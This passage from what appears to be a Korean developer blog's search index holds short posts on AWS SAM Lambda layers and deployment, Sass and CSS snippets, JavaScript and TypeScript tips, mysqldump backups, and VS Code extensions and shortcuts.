살펴보면 sam을 익히면 된다. 먼저 이 {&quot;message&quot;:&quot;hello world&quot;}는 어디서 왔을까? hello-world/app.js1234567891011121314151617exports.lambdaHandler = async (event, context) =&gt; { try { // const ret = await axios(url); response = { statusCode: 200, body: JSON.stringify({ message: 'hello world', // location: ret.data.trim() }), }; } catch (err) { console.log(err); return err; } return response;}; lambdaHandler라는 함수가 있는데 response객체를 반환한다. 근데 우리는 {“message”:”hello world”} 만 보이니까 body에 있는 내용을 조작하면 우리가 원하는 내용을 보낼 수 있겠구나 생각할 수 있다. 그러면 이 함수를 실행시키는 트리거, s22xid3g26.execute-api.ap-northeast-2.amazonaws.com/Prod/hello api 게이트웨이의 엔드포인트는 어디서 설정되었을까? template.yaml12345678910111213Resources: HelloWorldFunction: Type: AWS::Serverless::Function # More info about Function Resource: https://github.com/awslabs/serverless-application-model/blob/master/versions/2016-10-31.md#awsserverlessfunction Properties: CodeUri: hello-world/ Handler: app.lambdaHandler Runtime: nodejs12.x Events: HelloWorld: Type: Api # More info about API Event Source: https://github.com/awslabs/serverless-application-model/blob/master/versions/2016-10-31.md#api Properties: Path: /hello Method: get template.yaml을 보면 Events 아래 Type: Api가 보인다. hello라는 Path로 get 요청이 왔을때 라고 이해할 수 있다. 이제 이를 토대로 람다를 업그레이드 해보자","link":"/2020/09/21/sam-%EC%8B%9C%EC%9E%91%ED%95%98%EA%B8%B0/"},{"title":"samconfig.toml 에서 sam deploy 자동 y 설정하기","text":"cmd log123Previewing CloudFormation changeset before deployment======================================================Deploy this changeset? [y/N]: y deploy를 자주하다보면 이 y 누르는게 힘들다…. samconfig.toml 설정하기samconfig.toml12345678910version = 0.1[default][default.deploy][default.deploy.parameters]stack_name = &quot;test-sam-app&quot;s3_bucket = &quot;00000000000000000000000000000000000000000000000000000000000&quot;s3_prefix = &quot;test-sam-app&quot;region = &quot;ap-northeast-2&quot;confirm_changeset = falsecapabilities = &quot;CAPABILITY_IAM&quot; 처음 배포할때 -g옵션에서 설정했던것이 samconfig.toml에 저장되어있다. 1confirm_changeset = false 여기서 confirm_changeset을 flase로 바꿔주면 중간에 확인 과정을 생략할 수 있다. 편안..!","link":"/2020/09/21/samconfig-toml-%EC%97%90%EC%84%9C-sam-deploy-%EC%9E%90%EB%8F%99-y-%EC%84%A4%EC%A0%95%ED%95%98%EA%B8%B0/"},{"title":"sample-img","text":"web 개발하면서 샘플 이미지를 넣어보고 싶을 때.. Placeholder.com https://placeholder.com/#How_To_Use_Our_Placeholders &lt;- 사용법 index.html12&lt;img src=&quot;https://via.placeholder.com/468x200?text=Sample+Image&quot; /&gt;&lt;img src=&quot;https://via.placeholder.com/{가로}x{세로}?text={문자열}&quot; /&gt;","link":"/2020/10/05/sample-img/"},{"title":"sam에서 노드 모듈을 레이어로 빼기","text":"람다는 가벼운게 최고다. 노드 모듈은 따로 빼버리기! Lambda Layer nodejs로 치면 node_modules이다. 람다 함수에서 노드 모듈같은 종속성을 람다 함수 밖에으로 뺄 수 있음 왜 쓰냐? 공통적으로 쓰이는 패키지들을 묶어서 관리할 수 있음. 람다함수가 커지면 브라우저로 aws console에서 코드 조회를 못함. 따라하기외부 모듈을 사용해보기 sam template.yaml에서 layer설정할 수 있다. 지난번에 만든 hello world에서 이어서 진행해 보겠다. hello-world/app.js123// const axios = require('axios')// const url = 'http://checkip.amazonaws.com/';let response; hello-world/app.js123const axios = require('axios');const url = 'http://checkip.amazonaws.com/';let response; 맨 윗 2줄 주석 해제한다. hello-world/app.js1234567891011121314151617exports.lambdaHandler = async (event, context) =&gt; { try { // const ret = await axios(url); response = { statusCode: 200, body: JSON.stringify({ message: 'hello world', // location: ret.data.trim(), }), }; } catch (err) { console.log(err); return err; } return response;}; hello-world/app.js1234567891011121314151617exports.lambdaHandler = async (event, context) =&gt; { try { const ret = await axios(url); response = { statusCode: 200, body: JSON.stringify({ message: 'hello world', location: ret.data.trim(), }), }; } catch (err) { console.log(err); return err; } return response;}; 여기도 2곳 주석을 해제한다. package.json12345678910111213141516171819{ &quot;name&quot;: &quot;hello_world&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;hello world sample for NodeJS&quot;, &quot;main&quot;: &quot;app.js&quot;, &quot;repository&quot;: &quot;https://github.com/awslabs/aws-sam-cli/tree/develop/samcli/local/init/templates/cookiecutter-aws-sam-hello-nodejs&quot;, &quot;author&quot;: &quot;SAM CLI&quot;, &quot;license&quot;: &quot;MIT&quot;, &quot;dependencies&quot;: { &quot;axios&quot;: &quot;^0.18.0&quot; }, &quot;scripts&quot;: { &quot;test&quot;: &quot;mocha tests/unit/&quot; }, &quot;devDependencies&quot;: { &quot;chai&quot;: &quot;^4.2.0&quot;, &quot;mocha&quot;: &quot;^6.1.4&quot; }} 필요없는 devDependencies 를 없앤다. test 할때 필요한 패키지인데, 우리는 안쓸거다. package.json123456789101112131415{ &quot;name&quot;: &quot;hello_world&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;hello world sample for NodeJS&quot;, &quot;main&quot;: &quot;app.js&quot;, &quot;repository&quot;: &quot;https://github.com/awslabs/aws-sam-cli/tree/develop/samcli/local/init/templates/cookiecutter-aws-sam-hello-nodejs&quot;, &quot;author&quot;: &quot;SAM CLI&quot;, &quot;license&quot;: &quot;MIT&quot;, &quot;dependencies&quot;: { &quot;axios&quot;: &quot;^0.18.0&quot; }, &quot;scripts&quot;: { &quot;test&quot;: &quot;mocha tests/unit/&quot; }} 없애면 이런 모양이 된다. cmd12cd hello-worldnpm i app.js가 있는 hello-world 디렉터리로 와서 종속성을 설치한다. 12345678910111213.├── .aws-sam/├── events│ └── event.json├── hello-world│ ├── node_modules/│ ├── tests/│ ├── .npmignore│ ├── app.js│ └── package.json├── .gitignore├── README.md└── template.yaml node_modules 폴더가 생기면서 현재 디렉터리 구조는 이렇게 된다. hello-world/tests 폴더를 삭제한다. 우리는 안쓴다. events 폴더를 삭제한다. 우리는 안쓴다. .aws-sam 폴더를 삭제한다. 이 폴더가 있으면 local start-api 했을때 .aws-sam를 우선 참조하기때문에 소스 코드에 변경사항이 발생해도 반영되지 않는다. 123456789.├── hello-world│ ├── node_modules/│ ├── .npmignore│ ├── app.js│ └── package.json├── .gitignore├── README.md└── template.yaml 현재까지 디렉터리 구조는 이렇게 된다. 이제 로컬에서 테스트 해보자 참고 ; 로컬에서 sam 테스트하기 cmd12cd ..sam local start-api --skip-pull-image cmd log1234567C:\\tmp\\hello-world\\hello-world&gt;cd ..C:\\tmp\\hello-world&gt;sam local start-api --skip-pull-imageMounting HelloWorldFunction at http://127.0.0.1:3000/hello [GET]You can now browse to the above endpoints to invoke your functions. You do not need to restart/reload SAM CLI while working on your functions, changes will be reflected instantly/automatically. You only need to restart SAMCLI if you update your AWS SAM template2020-09-21 14:49:47 * Running on http://127.0.0.1:3000/ (Press CTRL+C to quit) http://127.0.0.1:3000/hello 에 접속한다. 이렇게 location에 자신의 공인 IP가 뜨면 성공이다. 주석 해제한 소스 코드는 axios라는 모듈로 http://checkip.amazonaws.com/ 에서 공인 ip를 얻어와 response 객체에 location이라는 이름으로 담아서 반환한 것이다. http://checkip.amazonaws.com/ 에 접속해 보면 알 수 있듯이 자신의 공인 ip를 알려주는 api다. 여기까지 axios라는 모듈을 이용해봤다. 이제 sam build &amp; sam deploy 를 통해 aws에 올려보자 cmd1sam build &amp; sam deploy 배포가 완료되면 엔드 포인트를 통해서 aws에 올린 람다를 실행해보자. 그러면 이상한 아이피가 나온다. 이게 aws 컴퓨터중에서 현재 람다가 실행된 컴퓨터의 공인 ip 주소이다. 여기까지 잘 작동되는 것이 확인 되었다. 외부 모듈을 layer로 빼기 이제 브라우저를 열고 aws console &gt; lambda &gt; HelloWorldFunction 으로 가서 함수가 어떻게 생겻는지 확인한다. 함수 안에 노드 모듈이 포함되어 있는 것을 확인할 수 있다. 이제 이 글의 핵심인 node_modules 폴더를 layer로 빼볼것이다. 레이어를 만드는 방법이 여러가지가 있지만 나는 내 방식을 설명해 보겠다. 나는 cmd명령을 사용할 것이다. template.yaml에서 빨간 네모 부분을 추가한다. template.yaml1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950AWSTemplateFormatVersion: '2010-09-09'Transform: AWS::Serverless-2016-10-31Description: &gt; hello-world Sample SAM Template for hello-world# More info about Globals: https://github.com/awslabs/serverless-application-model/blob/master/docs/globals.rstGlobals: Function: Timeout: 3Resources: HelloWorldFunction: Type: AWS::Serverless::Function # More info about Function Resource: https://github.com/awslabs/serverless-application-model/blob/master/versions/2016-10-31.md#awsserverlessfunction Properties: Layers: - !Ref DependencyLayer CodeUri: hello-world/ Handler: app.lambdaHandler Runtime: nodejs12.x Events: HelloWorld: Type: Api # More info about API Event Source: https://github.com/awslabs/serverless-application-model/blob/master/versions/2016-10-31.md#api Properties: Path: /hello Method: get DependencyLayer: Type: AWS::Serverless::LayerVersion Properties: LayerName: HelloWorldFunction-layer Description: Dependencies for HelloWorldFunction ContentUri: opt/ CompatibleRuntimes: - nodejs12.x RetentionPolicy: RetainOutputs: # ServerlessRestApi is an implicit API created out of Events key under Serverless::Function # Find out more about other implicit resources you can reference within SAM # https://github.com/awslabs/serverless-application-model/blob/master/docs/internals/generated_resources.rst#api HelloWorldApi: Description: 'API Gateway endpoint URL for Prod stage for Hello World function' Value: !Sub 'https://${ServerlessRestApi}.execute-api.${AWS::Region}.amazonaws.com/Prod/hello/' HelloWorldFunction: Description: 'Hello World Lambda Function ARN' Value: !GetAtt HelloWorldFunction.Arn HelloWorldFunctionIamRole: Description: 'Implicit IAM Role created for Hello World function' Value: !GetAtt HelloWorldFunctionRole.Arn 최종코드는 이러하다. 눈여겨 봐야할 것은 Resources아래에 DependencyLayer라는 이름으로 layer정의하고 ContentUri: opt/ 를 지정한다. 이 opt 디렉터리에 우리가 layer로 따로뺄 패키지가 들어가게 될것이다. 이제 배치파일을 2개 만들거다. layer.bat1234567echo layer processset functionDir=HelloWorldFunctionecho y|rmdir /s opt\\nodejsmkdir opt\\nodejsmove .aws-sam\\build\\%functionDir%\\node_modules opt\\nodejs layer.bat을 sam project 최상위에 만들고 내용은 위와같이 한다. set functionDir=HelloWorldFunction 에서는 template.yaml에서 지정한 함수명을 적어주면 된다. template.yaml을 안거드렸으면 HelloWorldFunction이니까 그대로 사용하면 된다. template.yaml123Resources: HelloWorldFunction: // &lt;- 이 이름과 매칭되도록 Type: AWS::Serverless::Function deploy.bat123echo deploysam build &amp; layer.bat &amp; sam deploy 또 deploy.bat을 sam project 최상위에 만들고 내용은 위와같이 한다. build하고 방금 만든 layer.bat으로 배포될 빌드 디렉터리에서 node_modules을 opt 디렉터리로 옮기고 deploy한다. 결과는 이렇게 된다. 1.2. 디렉터리 구조를 봐보면 node_modules 폴더가 없다 3.4. yaml에서 지정한 layer 등록되어 있는 것을 확인할 수 있다. 당연하게도 이 함수는 잘 동작한다. 여기까지 batch파일을 활용해서 노드모듈을 레이어로 빼는 방법을 알아보았다. 여기까지 프로젝트 파일","link":"/2020/09/21/sam%EC%97%90%EC%84%9C-%EB%85%B8%EB%93%9C-%EB%AA%A8%EB%93%88%EC%9D%84-%EB%A0%88%EC%9D%B4%EC%96%B4%EB%A1%9C-%EB%B9%BC%EA%B8%B0/"},{"title":"sass, scss 연습","text":"Learn Sass In 20 Minutes | Sass Crash Course 를 보면서 sass, scss 를 공부해보았다. sass1234567891011121314151617181920212223// 변수$primaryBtn: rgb(78, 201, 253);$textColor: rgb(0, 0, 0);button { background: $primaryBtn; // 중첩 nesting 가능 // &amp; ; 상위 선택자 &amp;::after { content: &quot;hellooo&quot;; } // 중첩된 속성 margin: { top: 10px; left: 20px; } padding: { bottom: 40px; right: 30px; }} 중첩 이 기능 하나만으로도 엄청나게 강력한 기능이라고 생각한다. 스타일 적용되는 것도 직관적이고, html이랑 같은 구조로 css를 작성할 수 있을 것 같다. 연습 코드 저장소 https://github.com/chinsun9/sass-practice","link":"/2020/12/23/sass-scss-%EC%97%B0%EC%8A%B5/"},{"title":"scroll css","text":"이런 모양의 스크롤바를 만들 수 있다 index.scss123456789101112131415161718/* scroll bar */&amp; { &amp;::-webkit-scrollbar { width: 10px; } &amp;::-webkit-scrollbar-track { background: #f1f1f1; } &amp;::-webkit-scrollbar-thumb { background: #888; } &amp;::-webkit-scrollbar-thumb:hover { background: #555; }}","link":"/2021/02/17/scroll-css/"},{"title":"setTimeout Promise","text":"12345678910111213141516171819202122232425const delay = (ms) =&gt; { return new Promise((resolve) =&gt; setTimeout(() =&gt; { resolve(ms); }, ms) );};const main = async () =&gt; { console.log(`main start`); const result = delay(1000); result.then(console.log); console.log(`main end`);};const main2 = async () =&gt; { console.log(`main start`); const result = await delay(1000); console.log(result); console.log(`main end`);};main();// main2(); promise를 알려주는 여러 글, 영상에서 setTimeout으로 예제로 진행한다 setTimeout을 promise로 감싸면 딜레이를 만들 수 있다 promise가 처음에 엄청 헷갈리는데, 막힐 때마다 이 예제를 먼저 작성해보고 적용해보았던 것 같다 참고 https://developer.mozilla.org/ko/docs/Web/JavaScript/Guide/Using_promises","link":"/2021/01/06/setTimeout-Promise/"},{"title":"shell script 경로에서 실행","text":"bash123dirpath=`dirname $0`echo $dirpathcd $dirpath 셸 스크립트 파일 경로로부터 명령을 실행할 수 있다","link":"/2020/11/02/shell-script-%EA%B2%BD%EB%A1%9C%EC%97%90%EC%84%9C-%EC%8B%A4%ED%96%89/"},{"title":"shell script 실행하기","text":"terminal123sh my_script.sh./my_script.sh","link":"/2020/11/17/shell-script-%EC%8B%A4%ED%96%89%ED%95%98%EA%B8%B0/"},{"title":"sqldump","text":"내 mysql, mariadb 백업, 덤프하는 방법 mysqldumpcmd123mysqldump -u root -p --databases {db_name} &gt; {백업파일위치}mysqldump -u root -p --databases mydb &gt; backup.sql 현재 db내용을 백업할 수 있다. ‘mysqldump’은(는) 내부 또는 외부 명령, 실행할 수 있는 프로그램, 또는 배치 파일이 아닙니다. mysql 또는 mariadb의 경우… db 설치 경로에 들어가서 mysqldump를 검색한다. 내 경우 C:\\Program Files\\MariaDB 10.5\\bin이 경로에 있었다. 해당 위치에서 cmd를 실행시키고 명령을 실행해주면된다. 액세스가 거부되었습니다. cmd를 관리자 권한으로 실행한다. mysql123mysql &lt; {백업파일위치}mysql &lt; backup.sql 이렇게 백업해둔 .sql파일로 복구할 수 있다.","link":"/2020/10/21/sqldump/"},{"title":"string to number 요상한 문법 (js)","text":"string type 변수앞에 + 기호를 넣으면 number type 으로 캐스팅된다… 이런 문법은 wow… example.ts1234567function squareValue(x: any) { return Math.pow(x * 1, 2);}function squareValue(x: string | number) { return Math.pow(+x, 2);} any 사용을 피하라는 예제를 코드를 보는데 우연히 알게되었다. 참고 https://www.sitepoint.com/10-essential-typescript-tips-tricks-angular/#typescripttip5avoidanyunlessitreallyisany","link":"/2020/12/21/string-to-number-%EC%9A%94%EC%83%81%ED%95%9C-%EB%AC%B8%EB%B2%95-js/"},{"title":"swift 카테고리 생성","text":"swift … 아이폰앱 만들면서 느낀점을 쓸 예정..","link":"/2020/09/17/swift%EC%B9%B4%ED%85%8C%EA%B3%A0%EB%A6%AC-%EC%83%9D%EC%84%B1/"},{"title":"tab key를 눌렀을 때 버튼으로 포커스 되는 것 방지하기","text":"example.html1234&lt;input type=&quot;text&quot; /&gt;&lt;button tabindex=&quot;-1&quot;&gt;나는 탭 키를 눌러도 포커스 되지 않지.&lt;/button&gt;&lt;button&gt;나는 탭 키를 누르면 포커스 되지...&lt;/button&gt;&lt;input type=&quot;text&quot; /&gt; example.tsx1234&lt;button type=&quot;button&quot; tabIndex={-1}&gt; 입력폼 같은걸을 작성할 때, tab 키로 다음 칸을 넘어가서 작성하는 경우가 있는데, tab 키는 기본적으로 button에도 포커스가 간다. 포커스가 가지 않도록 해보자. 참고 https://stackoverflow.com/questions/2757973/can-i-ignore-some-website-element-when-navigating-using-the-tab-key","link":"/2020/12/15/tab-key%EB%A5%BC-%EB%88%8C%EB%A0%80%EC%9D%84-%EB%95%8C-%EB%B2%84%ED%8A%BC%EC%9C%BC%EB%A1%9C-%ED%8F%AC%EC%BB%A4%EC%8A%A4-%EB%90%98%EB%8A%94-%EA%B2%83-%EB%B0%A9%EC%A7%80%ED%95%98%EA%B8%B0/"},{"title":"toc (목차) 사용하기","text":"안녕하세요저는친성입니다만나서반가워요다시만나요123456789---title: toc 사용하기date: 2020-09-17 09:22:30category: blogtags: - hexotoc: true--- toc: true를 추가시켜주면 헤딩 태그(h1~h6)를 파싱하여 목차를 만들어 줍니다. 처음에 적용해 보시면 목차 깊이가 2개밖에 되지 않는다고 생각할 수 있는데 스크롤 해보시면 숨겨져있다가 나옵니다!","link":"/2020/09/17/toc-%EB%AA%A9%EC%B0%A8-%EC%82%AC%EC%9A%A9%ED%95%98%EA%B8%B0/"},{"title":"ts-node","text":"terminal1ts-node src/index.ts tsc를 통해 .js파일로 만들고, js파일을 실행하는 것이 아니라 바로 .ts 파일을 실행하는 것처럼 보여준다. 따로 .js파일은 생성되지 않는다. ts-node 설치terminal1npm install -g ts-node 참고 TypeStrong/ts-node","link":"/2020/11/10/ts-node/"},{"title":"type vs interface","text":"12345678910// Xtype MyFile extends File = {}// Ointerface MyFile extends File { preview: string;}// Otype MyFile = {preview: string} &amp; File type은 extends, implements가 안됨. 대신 extends의 경우는 &amp; 키워드를 사용하여 대체할 수 있다. interface와 type은 거의 같은 역할을 한다. 그래서 둘중 하나만 사용하여 일관적인 스타일을 유지하는 게 좋다고 들었다. 참고 나는 typescript를 공부하면서 처음 접한게 type이라서 type을 쭉 사용해왔다. 그런데 상속을 해야하는 경우에 마추쳤을 때, 불가피하게 interface 키워드를 사용했고, type을 사용할 수 없을까 찾아보다가 type vs interface 에 대한 좋은 링크를 찾았다. https://blog.logrocket.com/types-vs-interfaces-in-typescript/","link":"/2020/12/16/type-vs-interface/"},{"title":"typescript json import","text":"tsconfig.json123456{ &quot;compilerOptions&quot;: { // (...) &quot;resolveJsonModule&quot;: true }} tsconfig.json 의 compilerOptions 부분에 resolveJsonModule를 추가한다 ex.ts1import myJsonData from './myJson.json'; 이런식으로 가져다 쓸 수 있다. 참고 https://stackoverflow.com/questions/57574481/angular-8-and-importing-json https://gracefullight.dev/2019/11/26/import-json-with-typescript-ts5071/","link":"/2020/11/10/typescript-json-import/"},{"title":"typescript에서 mathjs 사용해서 소수점 정확하게 계산하기","text":"부동소수점으로 인한 계산 오류가 있다. mathjs 라이브러리로 해결해보자. mathjs 설치12yarn add mathjsyarn add @types/mathjs -D mathjs만 설치하면 타입 정의가 없기 때문에 @types/mathjs 보조 라이브러리까지 설치 mathjs 임포트example1.ts1import * as math from &quot;mathjs&quot;; 그냥 기본값으로 사용하려면 import * as math from 'mathjs'로 불러와 사용 default export가 없어서 import math from 'mathjs'이런 식으로 사용불가. Attempted import error: &quot;mathjs&quot; does not contain a default export example2.ts123import { create, all } from &quot;mathjs&quot;;const mathF = create(all, { number: &quot;Fraction&quot; }) as math.MathJsStatic; 지정 config를 적용해 사용하려면 create 메서드 사용 create(all, { number: 'Fraction' }) as math.MathJsStatic as 키워드로 타입을 명시하지 않으면 undefined 에러 발생 Cannot invoke an object which is possibly 'undefined' 소수점 계산calc.ts123456789import { create, all } from &quot;mathjs&quot;;const mathF = create(all, { number: &quot;Fraction&quot; }) as math.MathJsStatic;const mathjsCalc = (expr: string) =&gt; { return mathF.number(mathF.evaluate(expr));};const result = mathjsCalc(`${value1} * ${value2} * 0.01`); evaluate메서드를 사용해서 수식 string을 주면 알아서 계산하도록 했다. 이때 math ConfigOptions에서 number 옵션이 기본값(number)인 경우에 일반적인 계산이 된다. number 옵션에 Fraction을 주고 생성하게 되면 evaluate 메서드에서 숫자를 Fraction 타입으로 파싱 해서 계산하게 되어 우리가 기대하는 결과를 얻을 수 있다. 참고 https://github.com/chinsun9/react-percentage-calculator https://mathjs.org/docs/getting_started.html","link":"/2020/12/21/typescript%EC%97%90%EC%84%9C-mathjs-%EC%82%AC%EC%9A%A9%ED%95%98%EA%B8%B0/"},{"title":"ubuntu ec2 remote-ssh 튕김","text":"아마존 리눅스는 안튕기는데 ubuntu는 튕긴다… vscode remote - ssh 를 통해 리모트했다. 처음에 연결이 잘되지만 한 1분 정도사용하면 튕긴다.","link":"/2020/10/27/ubuntu-ec2-remote-ssh-%ED%8A%95%EA%B9%80/"},{"title":"unity 카테고리 생성","text":"지금은 안하지만.. 기록차.. 예전에 했던 내용 올리기","link":"/2020/09/18/unity-%EC%B9%B4%ED%85%8C%EA%B3%A0%EB%A6%AC-%EC%83%9D%EC%84%B1/"},{"title":"vim 어드벤쳐","text":"vim 익히는데 게임이 있다. https://vim-adventures.com/ 얄팍한 코딩사전님의 영상보고 혹해서 해봤는데 나는 역시 마우스가…","link":"/2020/09/17/vim-%EC%96%B4%EB%93%9C%EB%B2%A4%EC%B3%90/"},{"title":"vscode console.log() 빨리치기 (snippets extension)","text":"cas→ console alert method console.assert(expression, object)ccl→ console clear console.clear()cco→ console count console.count(label)cdb→ console debug console.debug(object)cdi→ console dir console.dircer→ console error console.error(object)cgr→ console group console.group(label)cge→ console groupEnd console.groupEnd()clg→ console log console.log(object)clo→ console log object with name console.log(‘object :&gt;&gt; ‘, object);ctr→ console trace console.trace(object)cwa→ console warn console.warncin→ console info console.infoclt→ console table console.tablecti→ console time console.timecte→ console timeEnd console.timeEnd clg 를 치고 tab키를 console.log가 자동완성된다. 이밖에도 import from 자동완성 등 여러가지가 있다. ~ snippet 익스텐션을 깔면 사용할 수 있다. 나는 다양한 스니펫을 제공하는 ES7 React/Redux/GraphQL/React-Native snippets 익스텐션을 설치해서 사용하고 있다. 참고 JavaScript (ES6) code snippets ES7 React/Redux/GraphQL/React-Native snippets","link":"/2020/11/18/vscode-console-log-%EB%B9%A8%EB%A6%AC%EC%B9%98%EA%B8%B0/"},{"title":"vscode extension Settings Sync","text":"동일한 vscode 설정을 여러컴퓨터에 쉽게 동기화할 수 있다. github 아이디만 있으면된다. vscode setting, 확장도구 까지 모두 동기화할 수 있다. Settings Sync Settings Sync 확장도구를 설치한다. 깃허브에 로그인하고 사용한다. F1 &gt; Sync: Update/Upload Settings 로 현재 세팅을 업로드한다. 동기화하고싶은 다른 컴퓨터에서 F1 &gt; Sync: Download Settings 를 실행해 다운로드한다. 참고 Settings Sync","link":"/2020/11/19/vscode-extension-Settings-Sync/"},{"title":"vscode Tab 키로 () {} [] &#96;&#96; 키로 빠져나가기 TabOut","text":"와… 진짜 너무 편하다. 기존에 탭키를 누르면 탈출이 안되고, 들여쓰기 되서 힘들었는데 이 확장도구를 활성화하면 탭키로 () {} [] `` 이런 bracket? 들을 손쉽게 탈출할 수 있다. TabOut 설치하면 자동으로 active 상태이다 Ctrl + Shift + P 에서 toggle tabout으로 활성여부를 토글할 수 있다. 참고 TabOut Request for tabbing past matching brackets similar to VS · Issue #22864 · microsoft/vscode","link":"/2020/11/16/vscode-extension-TabOut/"},{"title":"vscode search exclude setting","text":"검색결과에서 제외할 디렉터리, 파일 설정하기 세팅창 화면으로 Ctrl + Shift + P 를 누르고 setting을 입력한다 Preferences: Open Settings (UI)로 들어간다 search: exclude 설정 검색에서 제외할 패턴들을 입력한다. 검색 제외 적용하기 … 을 클릭해서 디테일 표시 file to exclude 영역에 아이콘 활성화 왼쪽이 비활성화일 때 오른쪽이 활성화일 때 쓸때없는 것을 제외함으로써 쾌적한 검색결과를 확인할 수 있다. 상위 옵션 ; files.exclude vscode 탐색기에서 존재자체를 없애버리는 얘다. 여기서 제외된 디렉터리는 당연히 검색에서도 제외됨으로 search.exclude의 상위 호환이라고 볼 수 있다.","link":"/2020/11/06/vscode-search-exclude-setting/"},{"title":"vscode show all commands F1 키로 열기","text":"Ctrl + Shift + PF1 F1 키로도 명령창을 열 수 있다.","link":"/2020/11/18/vscode-show-all-commands-F1-%ED%82%A4%EB%A1%9C-%EC%97%B4%EA%B8%B0/"},{"title":"vscode 라인 이동 단축키","text":"Ctrl + G 오류 라인을 갈 때, Ctrl + G 로 마우스 손안대고 이동할 수 있다. Ctrl + rightArrowCtrl + leftArrow Ctrl + left|right arrow key 로 단어단위로 커서를 이동시킬 수 있다.","link":"/2020/11/02/vscode-%EB%9D%BC%EC%9D%B8-%EC%9D%B4%EB%8F%99-%EB%8B%A8%EC%B6%95%ED%82%A4/"},{"title":"vscode 라인 정렬","text":"정렬하고싶은 라인을 선택하고 F1 &gt; sort Lines 참고 https://medium.com/@adammlr/sort-css-properties-in-vscode-e59033c2c675 css 정렬하는 방법을 알아보다가 알게되었다. 이 사람은 css를 알파벳순으로 정렬하는 방법을 알려준다","link":"/2021/01/06/vscode-%EB%9D%BC%EC%9D%B8-%EC%A0%95%EB%A0%AC/"},{"title":"vscode 여러 종류의 쉘, 터미널 쉽게 열기","text":"Shell launcher 라는 확장프로그램을 통해 쉽게 다른 종류의 터미널을 열 수 있다. 설치하면 바로 사용가능하다. 윈도우 cmd를 쓰다가 리눅스 bash 명령어를 쓸일이 있어서 git bash 터미널을 열어 쓰는데 불편함이 느껴졌다. 기존에는 디폴트 터미널을 설정하고 터미널을 새로열면 해당 터미널을 사용할 수 있었는데, 디폴트 터미널을 변경되어서 다시 원래 쓰던 터미널로 돌렸어야했다. 이제 그런 귀찮은 과정을 하지않아도 된다. 참고 how-to-add-multiple-terminals-in-vs-code Shell launcher","link":"/2020/11/17/vscode-%EC%97%AC%EB%9F%AC-%EC%A2%85%EB%A5%98%EC%9D%98-%EC%89%98-%EC%89%BD%EA%B2%8C-%EC%97%B4%EA%B8%B0/"},{"title":"vscode 워크스페이스, 프로젝트별로 설정 다르게하기","text":"각 프로젝트 마다 다른 vscode세팅값을 주고 싶을 때 유용하다. 따라하기 Ctrl + Shift + P 단축키를누르고 setting을 입력한다 Preferences: Open Settings (UI)를 선택한다. 세팅화면이 나오면 상단 User, Workspace 탭이 있는데 Workspace탭을 클릭한다. 나는 예시로 이 프로젝트에서는 node_modules라는 폴더를 vscode 탐색기에서 보여주고싶지않다. exclude를 검색하면 Files: Exclude가 나오는데, Add Pattern 버튼을 눌러 node_modules를 추가한다. 우측 탐색기에서 node_modules 파일이 더이상 보이지 않으며, .vscode라는 폴더와 그 아래 settings.json이라는 파일이 생성된 것을 확인 할 수 있다. 이렇게 프로젝트별로 다른 vscode 세팅값을 가질 수 있다.","link":"/2020/11/02/vscode-%EC%9B%8C%ED%81%AC%EC%8A%A4%ED%8E%98%EC%9D%B4%EC%8A%A4-%ED%94%84%EB%A1%9C%EC%A0%9D%ED%8A%B8%EB%B3%84%EB%A1%9C-%EC%84%A4%EC%A0%95-%EB%8B%A4%EB%A5%B4%EA%B2%8C%ED%95%98%EA%B8%B0/"},{"title":"vscode 유용한 단축키","text":"김정환님 영상을 보고 정리한 내용 단축키 Ctrl Shift \\ Go to Bracket 현재 커서를 포함하는 괄호로 이동한다. F12 Go to Definition Alt F12 Peek Definition Ctrl 0 Focus into Side Bar Ctrl Shift . Focus Breadcrumbs Ctrl T Go to Symbol in Workspace # Ctrl Shift O Go to Symbol in Editor @ 참고 https://youtu.be/_QCNqV_EfzE","link":"/2021/01/05/vscode-%EC%9C%A0%EC%9A%A9%ED%95%9C-%EB%8B%A8%EC%B6%95%ED%82%A4/"},{"title":"vscode 절대경로 import, require 하기","text":"프로젝트 루트 경로를 / 로 표현하고 싶은데, 방법이… jsconfig.json123456789101112{ &quot;compilerOptions&quot;: { &quot;baseUrl&quot;: &quot;.&quot;, &quot;paths&quot;: { //Assuming your components/utilities live in ./src //Update this path as necessary &quot;/*&quot;: [&quot;./*&quot;] } }, //Add any build/compiled folders here to stop vscode searching those &quot;exclude&quot;: [&quot;node_modules&quot;, &quot;build&quot;]} 프로젝트 루트 경로에 jsconfig.json을 생성하고 내용을 위처럼 한다. 이렇게 내가 지정한 대로 참조가 되는 것을 확인할 수 있다. 참고로, 위 opt디렉터리는 내 프로젝트 루트에 있는 디렉터리이다. 활용한 곳 sam project에서 공통 모듈을 layer로 빼는데, layer로 뺀 공통 모듈을 임포트 할 때 상대 경로를 사용하기 껄끄러운 문제가 있었다. 로컬에서 개발할 때는 상대 경로로 개발하다가 (자동완성 위해) 람다를 배포할 때에, 배포하기 전에 절대 경로로 바꿔준다거나 하는 귀찮은 과정이 있었는데 jsconfig로 절대 경로를 사용해 내가 만든 공통 모듈을 임포트 해서 사용하니까 그런 귀찮은 과정을 하지 않을 수 있었다. 참고 https://nimblewebdeveloper.com/blog/absolute-alias-imports-in-javascript-vscode jsconfig.json123456789{ // ... &quot;paths&quot;: { &quot;/*&quot;: [&quot;./*&quot;], // 이런것도 된다. &quot;@hello/*&quot;: [&quot;./src/*&quot;] }}","link":"/2020/12/30/vscode-%EC%A0%88%EB%8C%80%EA%B2%BD%EB%A1%9C-import-require-%ED%95%98%EA%B8%B0/"},{"title":"vscode 카테고리 생성","text":"갓갓 편집기 vs code에 관한 내용 올리기","link":"/2020/09/18/vscode-%EC%B9%B4%ED%85%8C%EA%B3%A0%EB%A6%AC-%EC%83%9D%EC%84%B1/"},{"title":"vscode 터미널, 코드 에디터 포커스 왔다갔다하기","text":"keybindings.json123456789101112[ // ... { &quot;key&quot;: &quot;ctrl+shift+j&quot;, &quot;command&quot;: &quot;terminal.focus&quot; }, { &quot;key&quot;: &quot;ctrl+shift+j&quot;, &quot;command&quot;: &quot;workbench.action.focusActiveEditorGroup&quot;, &quot;when&quot;: &quot;terminalFocus&quot; }] 나는 위처럼 키바인딩을 해놨다. Open keyboard Shortcuts (JSON) 으로 들어가 설정한다. 가끔은 탐색에 포커스가 가있는 경우도 있는데, 이때에 에디터로 포커스하려면 ctrl + 1, ctrl + 